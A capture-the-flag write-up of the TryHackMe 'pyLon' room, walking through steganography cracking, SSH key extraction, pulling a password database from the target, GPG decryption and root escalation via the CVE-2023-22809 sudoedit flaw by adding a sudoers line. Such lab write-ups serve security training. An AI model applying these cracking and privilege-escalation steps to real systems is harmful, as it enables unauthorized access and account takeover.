<h1 align="center">pyLon</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/135028fa-b078-4382-9e63-20837b7f5094"><br>
2025, September 7<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>489</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>Can you penetrate the defenses and become root</em>?<br>
Access it <a href="https://tryhackme.com/room/pylonzf"</a>here.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/23192823-9356-4b30-a0d2-35f6d22e2318"></p>

<h2>Task 1 . recon</h2>
<p>After rummaging through a colleages drawer during a security audit, you find a USB key with an interesting file, you think its hiding something, use the data on the key to penetrate his workstation, and become root.<br>

This room contains steganography and may be difficult. If you are finding it difficult to overcome, read the hint for flag 1.<br>

Being able to analyse a file and determine its contents is important. Once you extract the hidden file in the image, there will be further work to do.<br>

Remember, password reuse is bad practice.<br>

<p><em>Answer the questions below</em></p>

<p>1.1. I have downloaded the file. Hint: <em>Click the Download button!</em><br>
<code>No answer needed</code></p>

<br>
<p>1.2. I have extracted the hidden file with steghide. Hint : <em>steghide extract -sf pepper.jpg</em><br>
<code>No answer needed</code></p>

<br>
<h2>Task 2 . pyLon</h2>
<p>You extracted some files, and now you will attempt to penetrate the system.</p>

<p><em>Answer the questions below</em></p>

<br>
<h2 align="center">nmap</h2>
<p>

- &nbsp;22  &nbsp; :  &nbsp; SSH<br>
- 222 &nbsp; :  &nbsp; SSH</p>

```bash
:~/pyLon# nmap -sC -sV -Pn -p- -T4 xx.xxx.xx.xx
...
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
222/tcp open  ssh     OpenSSH 8.4 (protocol 2.0)
```

<h2 align="center">/etc/hosts</h3>

```bash
xx.xxx.xx.xx  pylon.thm
```

<h2 align="center">Task File</h2>

<h4 align="center"><strong>pepper.jpg</strong> is <strong>JPEG</strong> 🤪</h4>

```bash
:~/pyLon# file pepper.jpg
pepper.jpg: JPEG image data, baseline, precision 8, 2551x1913, components 3
```

<h4 align="center">passphrase and filename <strong>lone</strong> identified. <strong>pepper.jpg.out</strong> extracted.</h4>

```bash
:~/pyLon# stegseek --crack pepper.jpg /usr/share/wordlists/rockyou.txt
...
[i] Found passphrase: "pepper"           
[i] Original filename: "lone".
[i] Extracting to "pepper.jpg.out".
```

<h4 align="center">extracted <strong>lone</strong></h4>

```bash
:~/pyLon# steghide extract -sf pepper.jpg
Enter passphrase:
wrote extracted data to "lone".
```

<h4 align="center"><strong>lone</strong> is <strong>ASCII</strong></h4>

```bash
:~/pyLon# file lone
lone: ASCII text
```

<h4 align="center"><strong>lone</strong>´s content</h4>

```bash
:~/pyLon# cat lone
H4sIAAAAAAAAA+3Vya6zyBUA4H/NU9w9ilxMBha9KObZDMY2bCIGG2MmMw9P39c3idRZtJJNK4rE
...
7Xa73W632+12/5XfActiLj0AKAAA
```

<h4 align="center">More about <strong>pepper.jpg</strong></h4>
<p>

- Subject                         : https://gchq.github.io/CyberChef/#recipe=To_Hex('None',0)To_Base85('!-u',false)<br>  
- Encoding Process                : Baseline DCT, Huffman coding</p>

```bash
:~/pyLon# exiftool pepper.jpg
ExifTool Version Number         : 12.76
File Name                       : pepper.jpg
Directory                       : .
File Size                       : 390 kB
File Modification Date/Time     : 2025:xx:xx xx:xx:xx-03:00
File Access Date/Time           : 2025:xx:xx xx:xx:xx-03:00
File Inode Change Date/Time     : 2025:xx:xx xx:xx:xx-03:00
File Permissions                : -rwxrwxrwx
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
XMP Toolkit                     : Image::ExifTool 12.16
Subject                         : https://gchq.github.io/CyberChef/#recipe=To_Hex('None',0)To_Base85('!-u',false)
Image Width                     : 2551
Image Height                    : 1913
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 2551x1913
Megapixels                      : 4.9
```

<h4 align="center">CyberChef</h4>

<img width="1354" height="438" alt="image" src="https://github.com/user-attachments/assets/bd635d1f-87e2-4ea2-98b7-0a98b1a7bd2c" />

<br>
<h4 align="center">Base64 decoded</h4>

```bash
:~/pyLon# base64 -d lone > lodeBase64decoded
```

<h4 align="center"><strong>lodeBase64decoded</strong> is gzip compressed</h4>

```bash
:~/pyLon# file loneBase64decoded
loneBase64decoded: gzip compressed data, from Unix, original size modulo 2^32 10240
```

<h4 align="center">renamed <strong>lodeBase64decoded</strong> to <strong>lone.gz</strong></h4>

```bash
:~/pyLon# mv loneBase64decoded lone.gz
```

<h4 align="center"><strong>lone.gz</strong> is a POSIX tar archive</h4>

```bash
:~/pyLon# file lone.gz
lone: POSIX tar archive (GNU)
```

<h4 align="center"><strong>lone.gz</strong>´s content extraction</h4>

```bash
:~/pyLon# tar -xf lone.gz
```

<h2 align="center"><strong>lone</strong>´s Private Key</h2>

```bash
:~/pyLon# cat lone_id
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
...
43kcLdLe8Jv/ETfTAAAAC3B5bG9uQHB5bG9uAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```

```bash
:~/pyLon# chmod 600 lone_id
```


<h2 align="center">lone</h2>
<h4 align="center">SSH</h4>

```bash
:~/pyLon# ssh -i lone_id lone@pylon.thm -p 222
```

```bash
               
                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

[*] Encryption key exists in database.

Enter your encryption key: 
```

```bash
               
                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

  
        [1] Decrypt a password.
        [2] Create new password.
        [3] Delete a password.
        [4] Search passwords.
        

Select an option [Q] to Quit: 1
```

```bash
               
                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

         SITE                        USERNAME
 [1]     pylon.thm                   lone                        
 [2]     FLAG 1                      FLAG 1                      

Select a password [C] to cancel: 2
```

<br>
<p>2.1. What is Flag 1?<br>
<code>THM{************************}</code></p>

```bash              
                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

    Password for FLAG 1

        Username = FLAG 1
        Password = THM{************************}           

Press ENTER to continue.
```

<br>

```bash              
               
                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

  
        [1] Decrypt a password.
        [2] Create new password.
        [3] Delete a password.
        [4] Search passwords.
        

Select an option [Q] to Quit: 4
```

```bash              
               
                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

         SITE                        USERNAME
 [1]     pylon.thm                   lone                        

Select a password [C] to cancel: 1
```

<p>

- lone : ***************4</p>

```bash            
               
                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

    Password for pylon.thm

        Username = lone
        Password = ***************4            

Press ENTER to continue.
```

<h4 align="center">SSH again</h4>

```bash            
:~/pyLon# ssh lone@pylon.thm
...
lone@pylon.thm's password:
...
Welcome to
                   /
       __         /       __    __
     /   ) /   / /      /   ) /   )
    /___/ (___/ /____/ (___/ /   /
   /         /
  /      (_ /       by LeonM

lone@pylon:~$ id
uid=1002(lone) gid=1002(lone) groups=1002(lone)
```

```bash     
lone@pylon:~$ pwd
/home/lone
```

```bash
lone@pylon:~$ ll
total 48
drwxr-x--- 6 lone lone 4096 Jan 30  2021 ./
drwxr-xr-x 5 root root 4096 Jan 30  2021 ../
lrwxrwxrwx 1 lone lone    9 Jan 30  2021 .bash_history -> /dev/null
-rw-r--r-- 1 lone lone  220 Jan 30  2021 .bash_logout
-rw-r--r-- 1 lone lone 3771 Jan 30  2021 .bashrc
drwx------ 2 lone lone 4096 Jan 30  2021 .cache/
-rw-rw-r-- 1 lone lone   44 Jan 30  2021 .gitconfig
drwx------ 4 lone lone 4096 Jan 30  2021 .gnupg/
drwxrwxr-x 3 lone lone 4096 Jan 30  2021 .local/
-rw-r--r-- 1 lone lone  807 Jan 30  2021 .profile
-rw-rw-r-- 1 pood pood  600 Jan 30  2021 note_from_pood.gpg
drwxr-xr-x 3 lone lone 4096 Jan 30  2021 pylon/
-rw-r--r-- 1 lone lone   18 Jan 30  2021 user1.txt
```

<br>
<p>2.2. What is User1 flag?<br>
<code>TMM{************}</code></p>

```bash     
lone@pylon:~$ cat user1.txt
TMM{************}
```

<img width="1013" height="399" alt="image" src="https://github.com/user-attachments/assets/9558a997-686b-421e-8dea-aba9a5413508" />

<br>
<br>

<h4 align="center">note_from_pood.gpg</h4>

```bash  
lone@pylon:~$ file note_from_pood.gpg
note_from_pood.gpg: PGP RSA encrypted session key - keyid: A7A53FD8 57FE0F16 RSA (Encrypt or Sign) 3072b .
```

<h3 align="center">users</h3>

```bash
lone@pylon:~$ cat /etc/passwd | grep "/bin/bash"
root:x:0:0:root:/root:/bin/bash
pylon:x:1000:1000:pylon:/home/pylon:/bin/bash
pood:x:1001:1001:poo D,,,:/home/pood:/bin/bash
lone:x:1002:1002:lon E,,,:/home/lone:/bin/bash
```

```bash
lone@pylon:/home$ ls
lone  pood  pylon
```

<h4 align="center">sudo privileges</h4>

```bash
lone@pylon:~$ sudo -l
[sudo] password for lone: 
Matching Defaults entries for lone on pylon:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lone may run the following commands on pylon:
    (root) /usr/sbin/openvpn /opt/openvpn/client.ovpn
```

```bash
lone@pylon:~$ cd pylon/
```

```bash
lone@pylon:~/pylon$ ll
total 40
drwxr-xr-x 3 lone lone 4096 Jan 30  2021 ./
drwxr-x--- 6 lone lone 4096 Jan 30  2021 ../
drwxrwxr-x 8 lone lone 4096 Jan 30  2021 .git/
-rw-rw-r-- 1 lone lone  793 Jan 30  2021 README.txt
-rw-rw-r-- 1 lone lone  340 Jan 30  2021 banner.b64
-rwxrwxr-x 1 lone lone 8413 Jan 30  2021 pyLon.py*
-rw-rw-r-- 1 lone lone 2195 Jan 30  2021 pyLon_crypt.py
-rw-rw-r-- 1 lone lone 3973 Jan 30  2021 pyLon_db.py
```

```bash
lone@pylon:~/pylon$ cd .git
```

<h4 align="center">git log</h4>
<p>

- Release version : 64d8bbfd991127aa8884c15184356a1d7b0b4d1a<br>
- Initial commit: cfc14d599b9b3cf24f909f66b5123ee0bbccc8da</p>

```bash
lone@pylon:~/pylon/.git$ git log
commit 73ba9ed2eec34a1626940f57c9a3145f5bdfd452 (HEAD, master)
Author: lone <lone@pylon.thm>
Date:   Sat Jan 30 02:55:46 2021 +0000

    actual release! whoops

commit 64d8bbfd991127aa8884c15184356a1d7b0b4d1a
Author: lone <lone@pylon.thm>
Date:   Sat Jan 30 02:54:00 2021 +0000

    Release version!

commit cfc14d599b9b3cf24f909f66b5123ee0bbccc8da
Author: lone <lone@pylon.thm>
Date:   Sat Jan 30 02:47:00 2021 +0000

    Initial commit!
```

<h4 align="center">git checkout</h4>

```bash
lone@pylon:~/pylon/.git$ git checkout cfc14d599b9b3cf24f909f66b5123ee0bbccc8da
```

<h4 align="center">git show</h4>
<p>

- pyLon_pwMan.py</p>

```bash
lone@pylon:~/pylon/.git$ git show 64d8bbfd991127aa8884c15184356a1d7b0b4d1a
commit 64d8bbfd991127aa8884c15184356a1d7b0b4d1a
Author: lone <lone@pylon.thm>
Date:   Sat Jan 30 02:54:00 2021 +0000

    Release version!

diff --git a/pyLon.db b/pyLon.db
deleted file mode 100644
index 68d04e0..0000000
Binary files a/pyLon.db and /dev/null differ
diff --git a/pyLon_pwMan.py b/pyLon.py
similarity index 100%
rename from pyLon_pwMan.py
rename to pyLon.py
```

<p>

- pyLon_pwMan.py</p>

```bash
lone@pylon:~/pylon/.git$ git show cfc14d599b9b3cf24f909f66b5123ee0bbccc8da
commit cfc14d599b9b3cf24f909f66b5123ee0bbccc8da
Author: lone <lone@pylon.thm>
Date:   Sat Jan 30 02:47:00 2021 +0000

    Initial commit!

diff --git a/README.txt b/README.txt
new file mode 100644
index 0000000..45e699d
--- /dev/null
+++ b/README.txt
@@ -0,0 +1,29 @@
+                  /^M
+      __         /       __    __^M
+    /   ) /   / /      /   ) /   )^M
+   /___/ (___/ /____/ (___/ /   /^M
+  /         /^M
+ /      (_ /  pyLon Password Manager^M
+                   by LeonM^M
+^M
+^M
+This program was designed to run in a terminal, it should run in IDLE^M
+but may not function fully as intended, for example the encryption key^M
+will not be hidden in IDLE as you type.^M
+^M
+the database is created in the current working directory not the directory^M
+of the program, so run it from where you want the database stored.^M
+^M
+to run:^M
+^M
+windows:^M
+c:\CWD> c:\path\to\python.exe pyLon_pwMan.py^M
+^M
+linux:^M
+~\pyLon$ python3 pyLon_pwMan.py^M
+^M
+To use the copy to clipboard function in linux you must install xclip^M
+^M
+$ sudo apt install xclip^M
+^M
+That is all, please enjoy this app.
\ No newline at end of file
diff --git a/banner.b64 b/banner.b64
new file mode 100644
index 0000000..c7287b0
--- /dev/null
+++ b/banner.b64
@@ -0,0 +1 @@
+ICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgIC8gICAgICAgICAgICAgICAKICAgICAgX18gICAgICAgICAvICAgICAgIF9fICAgIF9fCiAgICAvICAgKSAvICAgLyAvICAgICAgLyAgICkgLyAgICkKICAgL19fXy8gKF9fXy8gL19fX18vIChfX18vIC8gICAvCiAgLyAgICAgICAgIC8gICAgICAgICAgICAgICAgICAgICAKIC8gICAgICAoXyAvICBweUxvbiBQYXNzd29yZCBNYW5hZ2VyCiAgICAgICAgICAgICAgICAgICBieSBMZW9uTQo=
\ No newline at end of file
diff --git a/pyLon.db b/pyLon.db
new file mode 100644
```

<h4 align="center">hosts</h4>

```bash
lone@pylon:~/pylon$ getent hosts
127.0.0.1       localhost
127.0.1.1       pylon
127.0.0.1       ip6-localhost ip6-loopback
```

<h4 align="center">HTTP server</h4>

```bash
lone@pylon:~/pylon$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

<h4 align="center">pyLon.db</h4>

```bash
:~/pyLon# wget http://xx.xxx.xx.xx:8000/pyLon.db
...
pyLon.db                              100%[======================================================================>]  12.00K  --.-KB/s    in 0s      
```

<h4 align="center">HTTP server</h4>

```bash
lone@pylon:~/pylon$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
xx.xxx.xx.xxx - - [07/Sep/2025 xx:xx:xx] "GET /pyLon.db HTTP/1.1" 200 -
```

<h4 align="center">SQLite</h4>

```bash
:~/pyLon# file pyLon.db
pyLon.db: SQLite 3.x database, last written using SQLite version 3022000
```

```bash
:~/pyLon# sqlite3 pyLon.db
SQLite version 3.31.1 2020-01-27 xx:xx:xx
Enter ".help" for usage hints.
sqlite>
```

```bash
sqlite> .tables
pwCheck  pwMan
```

```bash
sqlite> SELECT * FROM pwMan;
pylon.thm_gpg_key|lone_gpg_key|40703************fc97947981e88a1
```

```bash
sqlite> SELECT * FROM pwCheck;
fc37a9f7a6115a98d549b52a42c8e3a9************8b4fbd787be41c12062f1505a23f07b850e578d8932769f232c8b4e7f2148762025a47952440a58ce3db
```

<h3 align="center">Hash Identification</h3>

```bash
:~/pyLon# snap install hash-id
```

```bash
:~/pyLon# hash-id --hash 40703************fc97947981e88a1
Hash: 40703************fc97947981e88a1
  [+] MD5
  [+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
  [+] RAdmin v2.x
  [+] NTLM
  [+] MD4
  [+] MD2
  [+] MD5(HMAC)
  [+] MD4(HMAC)
  [+] MD2(HMAC)
  [+] MD5(HMAC(Wordpress))
  [+] Haval-128
  [+] Haval-128(HMAC)
  [+] RipeMD-128
  [+] RipeMD-128(HMAC)
  [+] SNEFRU-128
  [+] SNEFRU-128(HMAC)
  [+] Tiger-128
  [+] Tiger-128(HMAC)
  [+] md5($pass.$salt)
  [+] md5($salt.'-'.md5($pass))
  [+] md5($salt.$pass)
  [+] md5($salt.$pass.$salt)
  [+] md5($salt.$pass.$username)
  [+] md5($salt.md5($pass))
  [+] md5($salt.md5($pass).$salt)
  [+] md5($salt.md5($pass.$salt))
  [+] md5($salt.md5($salt.$pass))
  [+] md5($salt.md5(md5($pass).$salt))
  [+] md5($username.0.$pass)
  [+] md5($username.LF.$pass)
  [+] md5($username.md5($pass).$salt)
  [+] md5(md5($pass))
  [+] md5(md5($pass).$salt)
  [+] md5(md5($pass).md5($salt))
  [+] md5(md5($salt).$pass)
  [+] md5(md5($salt).md5($pass))
  [+] md5(md5($username.$pass).$salt)
  [+] md5(md5(md5($pass)))
  [+] md5(md5(md5(md5($pass))))
  [+] md5(md5(md5(md5(md5($pass)))))
  [+] md5(sha1($pass))
  [+] md5(sha1(md5($pass)))
  [+] md5(sha1(md5(sha1($pass))))
  [+] md5(strtoupper(md5($pass)))
------------------------------------------
```

```bash
:~/pyLon# hash-id --hash fc37a9f7a6115a98d549b52a42c8e3a9************8b4fbd787be41c12062f1505a23f07b850e578d8932769f232c8b4e7f2148762025a47952440a58ce3db
Hash: fc37a9f7a6115a98d549b52a42c8e3a9************8b4fbd787be41c12062f1505a23f07b850e578d8932769f232c8b4e7f2148762025a47952440a58ce3db
  [+] SHA-512
  [+] Whirlpool
  [+] SHA-512(HMAC)
  [+] Whirlpool(HMAC)
------------------------------------------
```

<h3 align="center">Hash Cracking</h3>

```bash
:~/pyLon# ls
hashA  hashB  lone_id  pyLon.db
```

<p>

- Tried with John the Ripper.  Did not work.<br>
- Remembered of pyLon_pwMan.py.</p>

<h4 align="center">pyLon_pwMan.py</h4>

```bash
lone@pylon:~/pylon$ python3 pyLon_pwMan.py
```

```bash
                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

[*] Encryption key correct.  ***************
[*] Initialization complete.
```

```bash
               
                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

  
        [1] List passwords.
        [2] Decrypt a password.
        [3] Create new password.
        [4] Delete a password.
        [5] Search passwords.
        [6] Display help menu
        

Select an option [Q] to Quit: 2
```

```bash
               
                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

         SITE                        USERNAME
 [1]     pylon.thm_gpg_key           lone_gpg_key                

Select a password [C] to cancel: 1
```

```bash               
                  /               
      __         /       __    __
    /   ) /   / /      /   ) /   )
   /___/ (___/ /____/ (___/ /   /
  /         /                     
 /      (_ /  pyLon Password Manager
                   by LeonM

    Password for pylon.thm_gpg_key

        Username = lone_gpg_key
        Password = ****************            
```

```bash   
lone@pylon:~$ gpg -d note_from_pood.gpg
gpg: Note: secret key D83FA5A7160FFE57 expired at Fri Jan 27 19:13:48 2023 UTC
gpg: encrypted with 3072-bit RSA key, ID D83FA5A7160FFE57, created 2021-01-27
      "lon E <lone@pylon.thm>"
Hi Lone,

Can you please fix the openvpn config?

It's not behaving itself again.

oh, by the way, my password is ----------------

Thanks again.
```

```bash   
      ┌────────────────────────────────────────────────────────────────┐
      │ Please enter the passphrase to unlock the OpenPGP secret key:  │
      │ "lon E <lone@pylon.thm>"                                       │
      │ 3072-bit RSA key, ID D83FA5A7160FFE57,                         │
      │ created 2021-01-27 (main key ID EA097FFFA0996DAA).             │
      │                                                                │
      │                                                                │
      │ Passphrase: ****************__________________________________ │
      │                                                                │
      │         <OK>                                    <Cancel>       │
      └────────────────────────────────────────────────────────────────┘
```


<h2 align="center">pood</h3>

```bash   
lone@pylon:~$ su pood
Password: 
pood@pylon:/home/lone$
```

<br>
<p>2.3. What is User2 flag?<br>
<code>THM{***********************}</code></p>
<br>

```bash   
pood@pylon:~$ cat user2.txt
THM{***********************}
```

```bash 
pood@pylon:~$ ll
total 36
drwxr-x--- 5 pood pood 4096 Jan 30  2021 ./
drwxr-xr-x 5 root root 4096 Jan 30  2021 ../
lrwxrwxrwx 1 pood pood    9 Jan 30  2021 .bash_history -> /dev/null
-rw-r--r-- 1 pood pood  220 Jan 30  2021 .bash_logout
-rw-r--r-- 1 pood pood 3771 Jan 30  2021 .bashrc
drwx------ 2 pood pood 4096 Jan 30  2021 .cache/
drwx------ 4 pood pood 4096 Jan 30  2021 .gnupg/
drwxr-xr-x 3 pood pood 4096 Jan 30  2021 .local/
-rw-r--r-- 1 pood pood  807 Jan 30  2021 .profile
-rw-rw-r-- 1 pood pood   29 Jan 30  2021 user2.txt
```

<h4 align="center">pood´s privileges</h4>

```bash 
pood@pylon:~$ sudo -l
[sudo] password for pood: 
Matching Defaults entries for pood on pylon:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pood may run the following commands on pylon:
    (root) sudoedit /opt/openvpn/client.ovpn
```

<h4 align="center">client.ovpn edition</h4>
<p>

- Tried editing client.ovpn with different parameters. Did not work.</p>

```bash 
pood@pylon:~$ sudoedit /opt/openvpn/client.ovpn
```

<h2 align="center">CVE-2023-22809, Sudo Edit Privilege Escalation</h2>

```bash 
pood@pylon:/home/lone$ cd /tmp
```

<p>

- https://github.com/n3m1sys/CVE-2023-22809-sudoedit-privesc/blob/main/exploit.sh</p>

```bash 
pood@pylon:/tmp$ nano exploit.sh
```

```bash 
pood@pylon:/tmp$ chmod +x exploit.sh
pood@pylon:/tmp$ ./exploit.sh
> BINGO! User exploitable
> Opening sudoers file, please add the following line to the file in order to do the privesc:
pood ALL=(ALL:ALL) ALL
Press any key to continue...
```

<p>

- added <strong>pood ALL=(ALL:ALL) ALL</strong></p>


<img width="978" height="99" alt="image" src="https://github.com/user-attachments/assets/5c1994ff-56c4-4226-8e67-0ccead0d1947" />

<br>
<br>

<img width="1015" height="742" alt="image" src="https://github.com/user-attachments/assets/e3eb9d2d-28e6-448a-92a8-05c8951bc72e" />

<br>
<br>

<img width="1011" height="739" alt="image" src="https://github.com/user-attachments/assets/1f2e76f7-dbed-4a48-a258-25f102395bc8" />

<br>
<br>

<img width="1015" height="659" alt="image" src="https://github.com/user-attachments/assets/7bbcbdac-d8db-4cef-b051-f2151a354b22" />

<br>
<br>

<img width="1006" height="56" alt="image" src="https://github.com/user-attachments/assets/9737fd17-0393-4ddc-8143-f6b9aa6f8e69" />

<br>
<br>
- :wq</p>

<img width="996" height="70" alt="image" src="https://github.com/user-attachments/assets/d9f30090-d897-42ad-876c-6728ee924a9b" />

<br>
<br>
<p>

- :q</p>

<img width="1006" height="54" alt="image" src="https://github.com/user-attachments/assets/1859c953-3912-4c31-8ec4-652c36287c18" />

<br>
<br>

<img width="1016" height="215" alt="image" src="https://github.com/user-attachments/assets/dd2a5310-ec45-43b5-8ce5-f012f6654c5d" />


```bash 
root@pylon:~# id
uid=0(root) gid=0(root) groups=0(root)
```

```bash 
root@pylon:~# pwd
/root
```

```bash 
root@pylon:~# ls
root.txt.gpg
```

```bash 
root@pylon:~# gpg -d root.txt.gpg
gpg: Note: secret key 91B77766BE20A385 expired at Fri Jan 27 19:04:03 2023 UTC
gpg: encrypted with 3072-bit RSA key, ID 91B77766BE20A385, created 2021-01-27
      "I am g ROOT <root@pylon.thm>"
ThM{******************}
```

<img width="1087" height="226" alt="image" src="https://github.com/user-attachments/assets/fd1e0c74-5241-47ec-9f92-6cb431aeb83b" />

<br>
<br>
<p>2.4. What is root´s flag<br>
<code>ThM{******************}</code></p>
<br>




| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| July 14, 2025     | 433      |     159ᵗʰ    |      5ᵗʰ     |    192nd    |     8ᵗʰ    |  114,735 |    855    |     64    |








<br>
<br>
<h2 align="center">Completed</h2>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/9f82c161-a42d-4c21-af35-4455a0d1f3dc"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/515d4038-094d-406a-9414-62473122e9af"></p>

<h2 align="center">My TryHackMe Journey</h2>


<div align="center"><h6>

| Date              | Room                                  |Streak   |   All Time   |   All Time   |   Monthly   |   Monthly  | Points   | Rooms     | Badges    |
|:------------------|:--------------------------------------|--------:|:-----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |                                       |         |    Global    |    Brazil    |   Global    |   Brazil   |          | Completed |           |
| 2025, Sep 7       |Medium 🚩 - <code><strong>pyLon</strong></code>| 489     |     113ʳᵈ    |     5ᵗʰ      |    508ᵗʰ   |     9ᵗʰ    | 124,886  |  948      |    73     |
| 2025, Sep 7       |Medium 🚩 - Pressed                    | 489     |     113ʳᵈ    |     5ᵗʰ      |    508ᵗʰ   |     9ᵗʰ    | 124,886  |  948      |    73     |
| 2025, Sep 6       |Easy 🚩 - Classic Passwd               | 488     |     114ᵗʰ    |      5ᵗʰ     |     683ᵗʰ   |    12ⁿᵈ    | 124,476  |    947    |    73     |
| 2025, Sep 6       |Medium 🚩 - toc2                      | 488     |     114ᵗʰ    |      5ᵗʰ     |     695ᵗʰ   |    12ⁿᵈ    | 124,446  |    946    |    73     |
| 2025, Sep 6       |Hard 🚩 - Extract                      | 488     |     114ᵗʰ    |      5ᵗʰ     |     716ᵗʰ   |    13ʳᵈ    | 124,386  |    945    |    73     |
| 2025, Sep 6       |Medium 🚩 - Plotted-EMR                | 488     |     114ᵗʰ    |      5ᵗʰ     |     844ᵗʰ   |    12ⁿᵈ    | 124,326  |    944    |    73     |
| 2025, Sep 5       |Medium 🚩 - Inferno                    | 487     |     114ᵗʰ    |      5ᵗʰ     |     758ᵗʰ   |    12ⁿᵈ    | 124,236  |    943    |    73     |
| 2025, Sep 5       |Easy 🔗 - Psycho Break                 | 487     |     115ᵗʰ    |      5ᵗʰ     |     724ᵗʰ   |    10ᵗʰ    | 124,152  |    942    |    73     |
| 2025, Sep 4       |Medium 🔗 - IP and Domain Threat Intel | 486     |	   113ʳᵈ   |	     5ᵗʰ   	|      579ᵗʰ   |	  10ᵗʰ    |	124,018  |	  940	   |    73     |
| 2025, Sep 4       |Medium 🚩 - Cold VVars                 | 486     |     113ʳᵈ    |      5ᵗʰ     |     579ᵗʰ   |    10ᵗʰ    | 124,048  |    941    |    73     |
| 2025, Sep 3       |Easy 🔗 - Malware Classification       | 485     |     112ⁿᵈ    |      5ᵗʰ     |     714ᵗʰ   |    13ʳᵈ    | 123,882  |    939    |    73     |
| 2025, Sep 2       |Medium 🔗 - Session Forencics          | 484     |     111ˢᵗ    |      5ᵗʰ     |     706ᵗʰ   |    14ᵗʰ    | 123,786  |    938    |    73     |
| 2025, Sep 1       |Medium 🚩 - Voyage                     | 483     |     111ˢᵗ    |      5ᵗʰ     |     849ᵗʰ   |    15ᵗʰ    | 123,636  |    937    |    73     |

</h6></div><br>

<br>

<p align="center">Global All Time:   113ʳᵈ<br><img width="250px" src="https://github.com/user-attachments/assets/3b40a83d-b0ad-4075-9a3e-5b113ffebd9f"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/349d61b4-f8e5-4280-8cf0-dfd1d9b24029"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/3b4753fb-92ca-4337-99d4-166819240de0"><br>
                  Global monthly:    508ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/b84172f5-3d97-46eb-92f9-121b35f95b91"><br>
                  Brazil monthly:      9ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/dbd475d5-1dbc-4d35-aede-5b77a7d75021"><br>

<h2 align="center">Thanks for coming!</h2>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>

